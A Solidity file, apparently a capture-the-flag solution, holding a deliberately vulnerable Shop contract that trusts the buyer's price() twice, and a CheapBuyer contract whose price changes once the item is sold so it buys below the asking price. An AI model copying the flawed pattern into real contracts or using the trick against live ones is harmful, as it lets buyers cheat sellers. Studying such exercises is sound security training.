//SPDX-License-Identifier: MIT

pragma solidity 0.6.0;

interface Buyer {
  function price() external view returns (uint256);
}

contract Shop {
  uint256 public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}

contract CheapBuyer is Buyer {
  Shop public shop;

  function setShop(address _shop) public {
    shop = Shop(_shop);
  }

  function price() external view override returns (uint256) {
    if (!shop.isSold()) {
      return 100;
    }
    return 50;
  }

  function _buy() public {
    shop.buy();
  }
}